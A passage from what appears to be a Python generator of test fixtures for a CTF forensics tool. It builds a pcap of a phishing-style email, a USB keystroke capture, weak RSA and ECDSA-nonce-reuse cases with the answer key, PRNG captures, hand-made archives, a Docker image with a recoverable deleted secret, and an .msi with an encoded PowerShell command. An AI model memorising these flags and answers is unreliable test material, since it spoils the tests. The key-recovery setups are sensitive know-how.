        "From: Support <attacker@eldoria.invalid>\r\n"
        "To: selene@rangers.eldoria.invalid\r\n"
        "Subject: Bug Report - In-game Imbalance Issue\r\n"
        "Date: Wed, 29 Oct 2026 15:46:02 +0000\r\n"
        "MIME-Version: 1.0\r\n"
        'Content-Type: multipart/mixed; boundary="SEP42"\r\n'
        "\r\n"
        "--SEP42\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "\r\n" + base64.b64encode(body_html.encode()).decode() + "\r\n"
        "--SEP42\r\n"
        'Content-Type: application/zip; name="report.zip"\r\n'
        "Content-Transfer-Encoding: base64\r\n"
        'Content-Disposition: attachment; filename="report.zip"\r\n'
        "\r\n" + attachment + "\r\n"
        "--SEP42--\r\n"
    ).encode()
    # The IMAP server announces the exact size with a {N} literal, then sends it.
    imap = (
        b"* OK [CAPABILITY IMAP4rev1] ready\r\n"
        b"2 OK [READ-WRITE] SELECT completed\r\n"
        b"3 FETCH (BODY[] {" + str(len(message)).encode() + b"}\r\n" + message + b")\r\n"
        b"3 OK FETCH completed\r\n"
    )
    records = []
    time_base = 1700000700
    # Split across packets so the reassembly is exercised, like real IMAP.
    for index in range(0, len(imap), 1400):
        chunk = imap[index : index + 1400]
        records.append(
            pcap_packet(
                ethernet_ipv4(
                    "10.0.0.9", "10.0.0.20", 6, tcp_segment(143, 52000, 9000 + index, chunk)
                ),
                time_base + index // 1400,
            )
        )
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    write("audit_mail_imap.pcap", header + b"".join(records))

    # 8. A USB capture of someone typing the flag, with a typo they corrected:
    #    "CYBN{usb_keyz" + Backspace + "strokes}". Link type 220 = usbmon mmapped.
    typed = "CYBN{usb_keyz\bstrokes}\n"
    usb_header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 220)
    records = [
        pcap_packet(frame, 1700000600 + number)
        for number, frame in enumerate(usb_keystroke_frames(typed))
    ]
    write("audit_usb_keyboard.pcap", usb_header + b"".join(records))


def write_multi_message_fixtures() -> None:
    """The RSA mistakes that need two messages, plus an ECDSA nonce reuse.

    All deterministic: the primes come from the seeded RNG, and the ECDSA nonce
    and private key are drawn from a `random.Random` with a fixed seed, so
    `make fixtures` twice produces no diff.
    """
    # 1. Common modulus: the same n, two coprime exponents, one message.
    p = getPrime(512, randfunc=RNG.randbytes)
    q = getPrime(512, randfunc=RNG.randbytes)
    n = p * q
    message = bytes_to_long(b"CYBN{fixture_common_modulus}")
    for exponent, name in ((3, "a"), (65537, "b")):
        write(f"rsa_common_{name}.pub.pem", RSA.construct((n, exponent)).export_key())
        write(f"rsa_common_{name}.bin", long_to_bytes(pow(message, exponent, n)))

    # 2. Hastad broadcast: the same short message to three recipients, e = 3.
    broadcast = bytes_to_long(b"CYBN{fixture_hastad}")
    for index in range(1, 4):
        first = getPrime(512, randfunc=RNG.randbytes)
        second = getPrime(512, randfunc=RNG.randbytes)
        modulus = first * second
        assert broadcast**3 < modulus, "a broadcast needs m^e to fit under each modulus"
        write(f"rsa_broadcast_{index}.pub.pem", RSA.construct((modulus, 3)).export_key())
        write(f"rsa_broadcast_{index}.bin", long_to_bytes(pow(broadcast, 3, modulus)))

    # 3. Franklin-Reiter: two messages with m2 = 2*m1 + 1234567, same n and e.
    p = getPrime(512, randfunc=RNG.randbytes)
    q = getPrime(512, randfunc=RNG.randbytes)
    n = p * q
    first_message = bytes_to_long(b"CYBN{fixture_franklin_reiter}")
    second_message = (2 * first_message + 1234567) % n
    write("rsa_related.pub.pem", RSA.construct((n, 3)).export_key())
    write("rsa_related_1.bin", long_to_bytes(pow(first_message, 3, n)))
    write("rsa_related_2.bin", long_to_bytes(pow(second_message, 3, n)))

    # 4. ECDSA on secp256k1, signing twice with the same nonce.
    from ctfc.core import signatures as sigs

    curve = sigs.find_curve("secp256k1")
    draw = random.Random(20251030)
    private = draw.randrange(1, curve.n)
    nonce = draw.randrange(1, curve.n)
    public = curve.multiply(private)
    lines = ["# two ECDSA signatures over secp256k1, made with the same nonce"]
    for text in (b"transfer 10 to alice", b"transfer 10 to bob"):
        digest = sigs.hash_to_int(hashlib.sha256(text).digest(), curve.n)
        r = curve.multiply(nonce)[0] % curve.n
        s = (pow(nonce, -1, curve.n) * (digest + r * private)) % curve.n
        lines.append(f"r=0x{r:x} s=0x{s:x} h=0x{digest:x}")
    write("ecdsa_nonce_reuse.txt", "\n".join(lines) + "\n")
    point = b"\x04" + public[0].to_bytes(32, "big") + public[1].to_bytes(32, "big")
    write("ecdsa_nonce_reuse.pub", point.hex() + "\n")
    # The answer, so the test does not have to recompute it:
    write("ecdsa_nonce_reuse.key", f"{private:x}\n")


def write_prng_fixtures() -> None:
    """Captures of a weak random generator's output, as a challenge hands them over.

    `prng_mt19937.txt` is 624 consecutive `getrandbits(32)` values of a known
    seed, which is exactly MT19937's whole state; the test re-seeds the same
    generator to know what must come next.

    `prng_java_nextint.txt` is the real output of
    `new java.util.Random(1234567890123L).nextInt()`, checked against a JVM
    (openjdk on this machine) so the test is not just our own code agreeing with
    itself.
    """
    captured = random.Random(20251029)
    words = [captured.getrandbits(32) for _ in range(624)]
    write("prng_mt19937.txt", "\n".join(str(word) for word in words) + "\n")

    java_next_int = [-8722476, -1977939436, -999828940, -741339138]
    write("prng_java_nextint.txt", "\n".join(str(value) for value in java_next_int) + "\n")


# ---------------------------------------------------------------------------
# Archives that are not ZIPs (lot F): tar, 7z, RAR, cabinet, Docker image.
#
# Every one of these is a *real* archive, not a mock-up: the 7z and cabinet
# writers below were checked against `7z l` / `7z t`, the hand-written RAR 4
# passes `unrar t`, and the two RAR 5 archives are the output of RAR 7.00
# itself, frozen here as base64 because `rar` is not installed everywhere.
# ---------------------------------------------------------------------------


def seven_zip_number(value: int) -> bytes:
    """7z's variable-length number, for the sizes the writers below need.

    One byte up to 127, otherwise the 0x80 mask plus the value little-endian.
    That covers everything a fixture needs without writing the general form.
    """
    if value < 0x80:
        return bytes([value])
    if value < 0x10000:
        return bytes([0xC0 | (value >> 16)]) + value.to_bytes(2, "little")
    return bytes([0xE0]) + value.to_bytes(4, "little")


def seven_zip_files_info(names: list[str]) -> bytes:
    """The kFilesInfo property: just the names, which is all a fixture needs."""
    encoded = b"".join(name.encode("utf-16-le") + b"\x00\x00" for name in names)
    body = b"\x00" + encoded  # not external
    return (
        bytes([0x05])
        + seven_zip_number(len(names))
        + bytes([0x11])
        + seven_zip_number(len(body))
        + body
        + bytes([0x00])
    )


def lzma1_stream(data: bytes) -> tuple[bytes, bytes]:
    """Raw LZMA1 of `data`, plus the five property bytes a 7z coder stores."""
    import lzma

    filters = [{"id": lzma.FILTER_LZMA1, "dict_size": 1 << 20, "lc": 3, "lp": 0, "pb": 2}]
    compressor = lzma.LZMACompressor(format=lzma.FORMAT_RAW, filters=filters)
    stream = compressor.compress(data) + compressor.flush()
    properties = bytes([(2 * 5 + 0) * 9 + 3]) + (1 << 20).to_bytes(4, "little")
    return stream, properties


def seven_zip_streams_info(pack_size: int, coders: list[bytes], sizes: list[int]) -> bytes:
    """kPackInfo + kUnPackInfo for one folder holding one substream.

    `coders` are already-encoded coder records and `sizes` their output sizes,
    in the same order; several coders are wired as a straight chain.
    """
    pack_info = (
        bytes([0x06])  # kPackInfo
        + seven_zip_number(0)  # pack position
        + seven_zip_number(1)  # one pack stream
        + bytes([0x09])  # kSize
        + seven_zip_number(pack_size)
        + bytes([0x00])  # kEnd
    )
    folder = seven_zip_number(len(coders)) + b"".join(coders)
    # Bind pairs: coder N's input is fed by coder N-1's output.
    for index in range(1, len(coders)):
        folder += seven_zip_number(index) + seven_zip_number(index - 1)
    unpack_info = (
        bytes([0x07, 0x0B])  # kUnPackInfo, kFolder
        + seven_zip_number(1)  # one folder
        + bytes([0x00])  # not external
        + folder
        + bytes([0x0C])  # kCodersUnPackSize
        + b"".join(seven_zip_number(size) for size in sizes)
        + bytes([0x00])  # kEnd
    )
    return bytes([0x04]) + pack_info + unpack_info + bytes([0x00])  # kMainStreamsInfo


def seven_zip_finish(header: bytes, packed: bytes) -> bytes:
    """The signature header in front of a finished 7z body."""
    next_header = (
        len(packed).to_bytes(8, "little")
        + len(header).to_bytes(8, "little")
        + zlib.crc32(header).to_bytes(4, "little")
    )
    start = b"7z\xbc\xaf\x27\x1c\x00\x04" + zlib.crc32(next_header).to_bytes(4, "little")
    return start + next_header + packed + header


def seven_zip_lzma(name: str, content: bytes) -> bytes:
    """A 7z archive with one LZMA-compressed file and a plain header."""
    stream, properties = lzma1_stream(content)
    coder = (
        bytes([0x23, 0x03, 0x01, 0x01])  # flags: id size 3, attributes present
        + seven_zip_number(len(properties))
        + properties
    )
    header = (
        bytes([0x01])  # kHeader
        + seven_zip_streams_info(len(stream), [coder], [len(content)])
        + seven_zip_files_info([name])
        + bytes([0x00])  # kEnd
    )
    return seven_zip_finish(header, stream)


def seven_zip_encoded_header(name: str, content: bytes) -> bytes:
    """A 7z whose *header* is itself LZMA-compressed (kEncodedHeader).

    This is what 7z writes by default, and it is why `strings` on a .7z shows no
    file names: the listing has to be decompressed first.
    """
    stream, properties = lzma1_stream(content)
    coder = bytes([0x23, 0x03, 0x01, 0x01]) + seven_zip_number(len(properties)) + properties
    inner = (
        bytes([0x01])
        + seven_zip_streams_info(len(stream), [coder], [len(content)])
        + seven_zip_files_info([name])
        + bytes([0x00])
    )
    # The header becomes a second packed stream, right after the first.
    header_stream, header_properties = lzma1_stream(inner)
    header_coder = (
        bytes([0x23, 0x03, 0x01, 0x01])
        + seven_zip_number(len(header_properties))
        + header_properties
    )
    outer = (
        bytes([0x17])  # kEncodedHeader
        + bytes([0x06])
        + seven_zip_number(len(stream))  # pack position: after the file's stream
        + seven_zip_number(1)
        + bytes([0x09])
        + seven_zip_number(len(header_stream))
        + bytes([0x00])
        + bytes([0x07, 0x0B])
        + seven_zip_number(1)
        + bytes([0x00])
        + seven_zip_number(1)
        + header_coder
        + bytes([0x0C])
        + seven_zip_number(len(inner))
        + bytes([0x00])
        + bytes([0x00])
    )
    return seven_zip_finish(outer, stream + header_stream)


def seven_zip_key(password: str, salt: bytes, cycles_power: int) -> bytes:
    """7z's own key derivation: SHA-256 over salt || password || counter, repeated.

    Not PBKDF2 - 7-Zip hashes one long stream of (salt, the UTF-16LE password,
    an 8-byte little-endian round counter), 2**cycles_power times over. The
    fixture uses a small power so the tests stay fast; 7z's own default is 19.
    """
    digest = hashlib.sha256()
    encoded = password.encode("utf-16-le")
    for round_number in range(1 << cycles_power):
        digest.update(salt + encoded + round_number.to_bytes(8, "little"))
    return digest.digest()


def seven_zip_aes(name: str, content: bytes, password: str, cycles_power: int = 6) -> bytes:
    """A real AES-256 encrypted 7z (names in clear), as `7z a -p` writes it.

    The chain is AES over LZMA: the file is compressed first, then the compressed
    bytes are encrypted, which is why the coder list reads AES, then LZMA.
    """
    stream, properties = lzma1_stream(content)
    salt = b""
    iv = bytes(range(16))
    key = seven_zip_key(password, salt, cycles_power)
    padded = stream + b"\x00" * (-len(stream) % 16)
    encrypted = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
    # The AES coder's properties: the cycle count, then the IV, exactly as
    # 7-Zip encodes them (bit 0x40 says an IV follows, its length in byte 1).
    aes_properties = bytes([cycles_power | 0x40, len(iv) - 1]) + iv
    aes_coder = (
        bytes([0x24, 0x06, 0xF1, 0x07, 0x01])  # id size 4, attributes present
        + seven_zip_number(len(aes_properties))
        + aes_properties
    )
    lzma_coder = bytes([0x23, 0x03, 0x01, 0x01]) + seven_zip_number(len(properties)) + properties
    header = (
        bytes([0x01])
        + seven_zip_streams_info(
            len(encrypted), [aes_coder, lzma_coder], [len(stream), len(content)]
        )
        + seven_zip_files_info([name])
        + bytes([0x00])
    )
    return seven_zip_finish(header, encrypted)


def cab_write(files: list[tuple[str, bytes]], compress: str = "mszip") -> bytes:
    """A real Microsoft cabinet with one folder. Checked with `7z l` and `7z x`.

    MSZIP is raw deflate per 32 KB block, each block starting with the two bytes
    `CK` and using the previous block's output as its dictionary.
    """
    stream = b"".join(content for _, content in files)
    offsets: list[int] = []
    position = 0
    for _, content in files:
        offsets.append(position)
        position += len(content)

    blocks: list[tuple[bytes, int]] = []
    if compress == "stored":
        method = 0
        for start in range(0, max(1, len(stream)), 0x8000):
            chunk = stream[start : start + 0x8000]
            blocks.append((chunk, len(chunk)))
    else:
        method = 1
        history = b""
        for start in range(0, max(1, len(stream)), 0x8000):
            chunk = stream[start : start + 0x8000]
            compressor = (
                zlib.compressobj(9, zlib.DEFLATED, -15, zdict=history)
                if history
                else zlib.compressobj(9, zlib.DEFLATED, -15)
            )
            body = compressor.compress(chunk) + compressor.flush(zlib.Z_FINISH)
            blocks.append((b"CK" + body, len(chunk)))
            history = (history + chunk)[-0x8000:]

    entries = b""
    for (name, content), offset in zip(files, offsets, strict=True):
        # The date/time pair is an MS-DOS one: 2025-01-01 09:00:00.
        entries += struct.pack("<IIHHHH", len(content), offset, 0, 0x5A21, 0x4800, 0x20)
        entries += name.encode("ascii") + b"\x00"

    files_offset = 36 + 8
    data_offset = files_offset + len(entries)
    data = b""
    for body, uncompressed in blocks:
        data += struct.pack("<IHH", 0, len(body), uncompressed) + body
    header = struct.pack(
        "<4sIIIIIBBHHHHH",
        b"MSCF",
        0,
        data_offset + len(data),
        0,
        files_offset,
        0,
        3,
        1,
        1,
        len(files),
        0,
        0x1234,
        0,
    )
    return header + struct.pack("<IHH", data_offset, len(blocks), method) + entries + data


def rar4_block(kind: int, flags: int, body: bytes, data: bytes = b"") -> bytes:
    """One RAR 4 block: its own CRC, the 7-byte common header, then the data."""
    size = 7 + len(body)
    header = struct.pack("<BHH", kind, flags, size) + body
    return struct.pack("<H", zlib.crc32(header) & 0xFFFF) + header + data


def rar4_archive(files: list[tuple[str, bytes]], encrypted: bool = False) -> bytes:
    """A real RAR 4 archive with stored files. `unrar t` on this says "All OK"."""
    out = b"Rar!\x1a\x07\x00"
    out += rar4_block(0x73, 0x0000, struct.pack("<HI", 0, 0))  # archive header
    for name, content in files:
        encoded = name.encode("ascii")
        body = (
            struct.pack(
                "<IIBIIBBHI",
                len(content),  # packed size (also the data size that follows)
                len(content),  # unpacked size
                3,  # host OS: Unix
                zlib.crc32(content),
                0x5A214800,  # MS-DOS date/time
                20,  # written by RAR 2.0
                0x30,  # method 0x30: stored
                len(encoded),
                0x20,  # DOS attributes
            )
            + encoded
        )
        out += rar4_block(0x74, 0x8000 | (0x0004 if encrypted else 0), body, content)
    out += rar4_block(0x7B, 0x0000, b"")  # end of archive
    return out


# RAR 5 archives produced by RAR 7.00 itself, with
#   rar a -m0 -tsm- -tsa- -tsc- -ep <name>.rar flag.txt notes.txt
# (the -ts switches drop the timestamps, which is what makes the bytes stable),
# and `-ppassword123` / `-hppassword123` for the two encrypted ones. Frozen here
# because `rar` is not free software and is not installed everywhere; each was
# checked with `unrar l` and `unrar t`.
RAR5_STORED = """
UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADxthVwGgICkAAEkACkgwK4DyXJgAABCGZsYWcudHh0Q1lC
TntyYXI1X2ZsYWd9CjB4TIsbAgKfAASfAKSDAmY1396AAAEJbm90ZXMudHh0YWFhYWFhYWFhYWFh
YWFhYWFhYWFhYWFhYWFhYWFhCh13VlEDBQQA
"""
RAR5_ENCRYPTED_FILES = """
UmFyIRoHAQAzkrXlCgEFBgAFAQGAgABV5DnVTAIDMZAABJAApIMCLDZbWIAAAQhmbGFnLnR4dDAB
AAMPqO15v9LpTq2lt+YJRJ9gBs0B+VXAZD5CjA5zIW4XRoowwh/7zSOOri3bw3je1Pgbr+8R/Nr7
hVeDvYeCe5qur00CAzGgAASfAKSDAnFOreeAAAEJbm90ZXMudHh0MAEAAw+o7Xm/0ulOraW35glE
n2AGrSxXVl8A/plHzMpZKTtx3TDCH/vNI46uLdvDeAvTKzmoAh3MQYOMcEXYU6/PO+O/deH6VpyA
+B569V35HXdWUQMFBAA=
"""
RAR5_ENCRYPTED_HEADERS = """
UmFyIRoHAQBHUtguIQQAAAEP6JrBYTWajUngyELXFr60vcahu0i1F8U1zeKtDNfXe/9xb7Uv1Wd7
VZRTQp4So5yvxUI0Nvq55JGXpYoBpr+dRRiYTi30XDMkxsyH2FJ2dhQRfVdxglpAmdSJm+D2mFEJ
o8rWFxR3KhIYSs+B+219EFjnosbc5fSLhYm13sutaVxMdBMNPmJGrz5Tz2RwojsG3CJchUq/pWsO
Mv+Bd1m0Nvz2/6qTCMK9P4QbVY+JhSj4xgjotuwtryIiVTWEBhsjUlc60n/yYF61F+5Qy0FQ3pf6
ykd+hxptrr9dTQ==
"""


def tar_member(name: str, content: bytes, kind: str = "0", mode: int = 0o644) -> bytes:
    """One 512-byte tar header plus its padded data, written by hand.

    Written out rather than taken from `tarfile` so that the fixture has no
    timestamp in it and the bytes never change.
    """
    header = bytearray(512)
    encoded = name.encode("utf-8")
    header[0 : len(encoded)] = encoded
    header[100:108] = b"%07o\x00" % mode
    header[108:116] = b"0000000\x00"
    header[116:124] = b"0000000\x00"
    header[124:136] = b"%011o\x00" % len(content)
    header[136:148] = b"00000000000\x00"  # mtime 0: the epoch, so it never moves
    header[148:156] = b" " * 8  # the checksum field reads as spaces while summing
    header[156:157] = kind.encode()
    header[257:263] = b"ustar\x00"
    header[263:265] = b"00"
    header[265:271] = b"ctfc\x00\x00"
    header[297:303] = b"ctfc\x00\x00"
    header[148:156] = b"%06o\x00 " % sum(header)
    return bytes(header) + content + b"\x00" * (-len(content) % 512)


def tar_archive(members: list[tuple[str, bytes]], trailing: bytes = b"") -> bytes:
    """A tar, with the two zero blocks that end it - and anything appended after."""
    body = b"".join(tar_member(name, content) for name, content in members)
    return body + b"\x00" * 1024 + trailing


def docker_layer(members: list[tuple[str, bytes]]) -> bytes:
    """One layer: a tar of the files that layer adds (or whites out)."""
    return tar_archive(members)


def docker_image_tar() -> bytes:
    """A saved Docker image in the legacy layout, with a secret deleted by a layer.

    The shape `docker save` writes: a manifest naming the layers in build order,
    a configuration carrying the `history` (so each layer can be labelled with
    its Dockerfile line), and one `layer.tar` per layer. The third layer deletes
    `app/secret.txt` the only way a layer can - by adding a `.wh.` marker - so
    the file itself is still sitting in layer two.
    """
    layers = [
        docker_layer([("usr/bin/app", b"#!/bin/sh\necho hello\n")]),
        docker_layer(
            [
                ("app/secret.txt", b"CYBN{docker_whiteout}\n"),
                ("app/keep.txt", b"this one stays\n"),
            ]
        ),
        docker_layer([("app/.wh.secret.txt", b"")]),
    ]
    digests = [hashlib.sha256(layer).hexdigest() for layer in layers]
    config = {
        "architecture": "amd64",
        "config": {
            "Env": ["PATH=/usr/bin", "APP_TOKEN=CYBN{docker_env_token}"],
            "Cmd": ["/usr/bin/app"],
        },
        "history": [
            {"created_by": "FROM scratch", "empty_layer": True},
            {"created_by": "COPY app /usr/bin/app"},
            {"created_by": "COPY secret.txt keep.txt /app/"},
            {"created_by": "RUN rm /app/secret.txt"},
            {"created_by": 'CMD ["/usr/bin/app"]', "empty_layer": True},
        ],
    }
    config_bytes = json.dumps(config, indent=2, sort_keys=True).encode()
    config_name = hashlib.sha256(config_bytes).hexdigest() + ".json"
    manifest = [
        {
            "Config": config_name,
            "RepoTags": ["ctfc/demo:1"],
            "Layers": [f"{digest}/layer.tar" for digest in digests],
        }
    ]
    members: list[tuple[str, bytes]] = [
        ("manifest.json", json.dumps(manifest, indent=2).encode()),
        (config_name, config_bytes),
    ]
    for digest, layer in zip(digests, layers, strict=True):
        members.append((f"{digest}/VERSION", b"1.0"))
        members.append((f"{digest}/json", b'{"id": "%s"}' % digest.encode()))
        members.append((f"{digest}/layer.tar", layer))
    return tar_archive(members)


def write_archive_fixtures() -> None:
    """tar / 7z / RAR / cabinet / Docker image, for `ctfc archive`."""
    flag = b"CYBN{sevenzip_lzma}\n"
    write("archive_lzma.7z", seven_zip_lzma("flag.txt", flag * 4))
    write(
        "archive_encoded_header.7z",
        seven_zip_encoded_header("hidden.txt", b"CYBN{sevenzip_encoded_header}\n" * 3),
    )
    write(
        "archive_aes.7z",
        seven_zip_aes("secret.txt", b"CYBN{sevenzip_aes}\n" * 3, "password123"),
    )
    write(
        "archive_mszip.cab",
        cab_write(
            [("flag.txt", b"CYBN{cabinet_mszip}\n"), ("readme.txt", b"nothing to see\n" * 50)],
            "mszip",
        ),
    )
    write(
        "archive_stored.rar",
        rar4_archive([("flag.txt", b"CYBN{rar4_stored}\n"), ("notes.txt", b"a" * 30)]),
    )
    write(
        "archive_encrypted.rar",
        rar4_archive([("flag.txt", b"CYBN{rar4_encrypted}\n")], encrypted=True),
    )
    write("archive_rar5_stored.rar", base64.b64decode("".join(RAR5_STORED.split())))
    write("archive_rar5_encrypted.rar", base64.b64decode("".join(RAR5_ENCRYPTED_FILES.split())))
    write(
        "archive_rar5_header_encrypted.rar",
        base64.b64decode("".join(RAR5_ENCRYPTED_HEADERS.split())),
    )
    # A tar with a PNG appended after the end-of-archive blocks: `tar tf` shows
    # the three files and nothing else.
    write(
        "archive_appended.tar",
        tar_archive(
            [
                ("flag.txt", b"CYBN{tar_plain}\n"),
                ("notes/readme.txt", b"read me\n"),
                ("notes/deep/file.bin", bytes(range(64))),
            ],
            trailing=tiny_png(),
        ),
    )
    write("archive_docker_image.tar", docker_image_tar())


# ---------------------------------------------------------------------------
# Compound-file formats that are not documents (lot F): Outlook .msg, Windows
# Installer .msi, and a .doc carrying an embedded object.
#
# The writer below builds a real OLE2 file, mini stream and all: `7z l` lists
# these fixtures, and for the .msi it decodes the table names, which is the
# independent check that our name encoding is right.
# ---------------------------------------------------------------------------


# --- a general OLE2 writer, needed for the .msg / .msi / embedded-object
# fixtures, whose streams are far smaller than a sector and so have to live in
# the mini stream. `cfb_write` above predates it and stays as it is.
SECTOR = 512
MINI = 64
MINI_CUTOFF = 4096
ENDOFCHAIN = 0xFFFFFFFE
FREESECT = 0xFFFFFFFF
FATSECT = 0xFFFFFFFD
NOSTREAM = 0xFFFFFFFF


class Node:
    def __init__(self, name: str, kind: int, payload: bytes = b"") -> None:
        self.name = name
        self.kind = kind  # 1 storage, 2 stream, 5 root
        self.payload = payload
        self.children: list[Node] = []
        self.index = 0
        self.start = ENDOFCHAIN
        self.size = len(payload)


def _build_tree(entries: list[tuple[str, bytes]]) -> Node:
    root = Node("Root Entry", 5)
    for path, payload in entries:
        parts = path.split("/")
        current = root
        for part in parts[:-1]:
            existing = next((c for c in current.children if c.name == part and c.kind == 1), None)
            if existing is None:
                existing = Node(part, 1)
                current.children.append(existing)
            current = existing
        current.children.append(Node(parts[-1], 2, payload))
    return root


def _flatten(root: Node) -> list[Node]:
    """Directory entries in file order: root first, then every node."""
    order = [root]
    queue = [root]
    while queue:
        node = queue.pop(0)
        for child in node.children:
            order.append(child)
            queue.append(child)
    for position, node in enumerate(order):
        node.index = position
    return order


def cfb_write_tree(entries: list[tuple[str, bytes]]) -> bytes:
    """Build a compound file holding `entries` ("Storage/name", bytes)."""
    root = _build_tree(entries)
    order = _flatten(root)
    streams = [node for node in order if node.kind == 2]

    # --- the mini stream: every stream under the cutoff, each padded to 64 bytes
    mini_payload = bytearray()
    mini_fat: list[int] = []
    for node in streams:
        if node.size >= MINI_CUTOFF or node.size == 0:
            continue
        node.start = len(mini_payload) // MINI
        chunk = node.payload + b"\x00" * (-node.size % MINI)
        count = len(chunk) // MINI
        for step in range(count):
            mini_fat.append(ENDOFCHAIN if step == count - 1 else node.start + step + 1)
        mini_payload += chunk
    mini_stream = bytes(mini_payload)

    # --- sector layout: FAT, directory, mini FAT, mini stream, then big streams
    big = [node for node in streams if node.size >= MINI_CUTOFF]
    directory_sectors = max(1, -(-len(order) * 128 // SECTOR))
    mini_fat_sectors = -(-len(mini_fat) * 4 // SECTOR) if mini_fat else 0
    mini_stream_sectors = -(-len(mini_stream) // SECTOR) if mini_stream else 0
    big_sectors = [(-(-node.size // SECTOR)) for node in big]
    total_sectors = directory_sectors + mini_fat_sectors + mini_stream_sectors + sum(big_sectors)
    # The FAT must also describe its own sectors.
    fat_sectors = 1
    while (total_sectors + fat_sectors) * 4 > fat_sectors * SECTOR:
        fat_sectors += 1

    fat: list[int] = []
    body: list[bytes] = []
    next_free = 0

    def allocate(data: bytes, count: int) -> int:
        """Put `data` in `count` consecutive sectors, chain them, return the first."""
        nonlocal next_free
        first = next_free
        padded = data + b"\x00" * (count * SECTOR - len(data))
        for step in range(count):
            body.append(padded[step * SECTOR : (step + 1) * SECTOR])
            fat.append(ENDOFCHAIN if step == count - 1 else first + step + 1)
        next_free += count
        return first

    # The FAT sectors come first and describe themselves.
    for _ in range(fat_sectors):
        body.append(b"")  # placeholder, filled in at the end
        fat.append(FATSECT)
    next_free = fat_sectors

    directory = b"".join(_entry_bytes(node, order) for node in order)
    directory_start = allocate(directory, directory_sectors)
    mini_fat_start = (
        allocate(b"".join(value.to_bytes(4, "little") for value in mini_fat), mini_fat_sectors)
        if mini_fat_sectors
        else ENDOFCHAIN
    )
    root.start = allocate(mini_stream, mini_stream_sectors) if mini_stream_sectors else ENDOFCHAIN
    root.size = len(mini_stream)
    for node, count in zip(big, big_sectors, strict=True):
        node.start = allocate(node.payload, count)

    # Rebuild the directory now that every start sector is known.
    directory = b"".join(_entry_bytes(node, order) for node in order)
    padded = directory + b"\x00" * (directory_sectors * SECTOR - len(directory))
    for step in range(directory_sectors):
        body[directory_start + step] = padded[step * SECTOR : (step + 1) * SECTOR]

    while len(fat) % (SECTOR // 4):
        fat.append(FREESECT)
    fat_bytes = b"".join(value.to_bytes(4, "little") for value in fat)
    for index in range(fat_sectors):
        body[index] = fat_bytes[index * SECTOR : (index + 1) * SECTOR].ljust(SECTOR, b"\xff")

    header = bytearray(512)
    header[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
    header[24:26] = (0x3E).to_bytes(2, "little")
    header[26:28] = (3).to_bytes(2, "little")
    header[28:30] = (0xFFFE).to_bytes(2, "little")
    header[30:32] = (9).to_bytes(2, "little")
    header[32:34] = (6).to_bytes(2, "little")
    header[44:48] = fat_sectors.to_bytes(4, "little")
    header[48:52] = directory_start.to_bytes(4, "little")
    header[56:60] = MINI_CUTOFF.to_bytes(4, "little")
    header[60:64] = (mini_fat_start if mini_fat_sectors else ENDOFCHAIN).to_bytes(4, "little")
    header[64:68] = mini_fat_sectors.to_bytes(4, "little")
    header[68:72] = ENDOFCHAIN.to_bytes(4, "little")
    header[72:76] = (0).to_bytes(4, "little")
    difat = [FREESECT] * 109
    for index in range(min(fat_sectors, 109)):
        difat[index] = index
    header[76:512] = b"".join(value.to_bytes(4, "little") for value in difat)
    return bytes(header) + b"".join(body)


def _entry_bytes(node: Node, order: list[Node]) -> bytes:
    """One 128-byte directory entry. Children are a right-leaning chain."""
    raw = bytearray(128)
    encoded = node.name.encode("utf-16-le")[:62]
    raw[: len(encoded)] = encoded
    raw[64:66] = (len(encoded) + 2).to_bytes(2, "little")
    raw[66] = node.kind
    raw[67] = 1  # black
    left = NOSTREAM
    right = NOSTREAM
    parent = next((n for n in order if node in n.children), None)
    if parent is not None:
        position = parent.children.index(node)
        if position + 1 < len(parent.children):
            right = parent.children[position + 1].index
    child = node.children[0].index if node.children and node.kind in (1, 5) else NOSTREAM
    raw[68:72] = left.to_bytes(4, "little")
    raw[72:76] = right.to_bytes(4, "little")
    raw[76:80] = child.to_bytes(4, "little")
    raw[116:120] = node.start.to_bytes(4, "little")
    raw[120:128] = node.size.to_bytes(8, "little")
    return bytes(raw)


def msg_property(tag: int, kind: int = 0x001F) -> str:
    """A MAPI property stream name: `__substg1.0_` + four hex digits each."""
    return f"__substg1.0_{tag:04X}{kind:04X}"


def outlook_msg() -> bytes:
    """An Outlook .msg: headers, body, one recipient, one attachment.

    Written from MS-OXMSG: every value is a MAPI property in its own stream,
    text ones as UTF-16LE (type 001F), the attachment as binary (type 0102).
    """

    def text(value: str) -> bytes:
        return value.encode("utf-16-le")

    attachment = small_zip("flag.txt", b"CYBN{msg_attachment}")
    headers = (
        "Received: from mail.example.org (mail.example.org [203.0.113.7])\r\n"
        "\tby mx.corp.local with ESMTP id 42; Tue, 3 Nov 2026 09:00:00 +0100\r\n"
        "From: Alice <alice@example.org>\r\n"
        "To: Bob <bob@corp.local>\r\n"
        "Subject: the archive you asked for\r\n"
        "Message-ID: <20261103@example.org>\r\n"
    )
    entries = [
        (msg_property(0x0037), text("the archive you asked for")),
        (msg_property(0x0C1A), text("Alice")),
        (msg_property(0x0C1F), text("alice@example.org")),
        (msg_property(0x0E04), text("Bob <bob@corp.local>")),
        (msg_property(0x001A), text("IPM.Note")),
        (msg_property(0x1000), text("Hi Bob,\r\nthe password is CYBN{msg_body}.\r\nAlice\r\n")),
        (msg_property(0x007D), text(headers)),
        (f"__recip_version1.0_#00000000/{msg_property(0x3001)}", text("Bob")),
        (f"__recip_version1.0_#00000000/{msg_property(0x39FE)}", text("bob@corp.local")),
        (f"__attach_version1.0_#00000000/{msg_property(0x3707)}", text("secret.zip")),
        (f"__attach_version1.0_#00000000/{msg_property(0x370E)}", text("application/zip")),
        (f"__attach_version1.0_#00000000/{msg_property(0x3701, 0x0102)}", attachment),
    ]
    return cfb_write_tree(entries)


def installer_msi() -> bytes:
    """A Windows Installer package: string pool, tables, embedded cabinet.

    The stream names go through the MSI encoding (`ctfc/core/msi.py` has the
    alphabet and its inverse), the string pool is a (length, refcount) pair per
    string with the code page in the first pair, and the payload is a cabinet
    stored as one more stream - exactly how a real .msi carries it.
    """
    from ctfc.core.msi import encode_name

    command = "Write-Host 'CYBN{msi_encoded_command}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
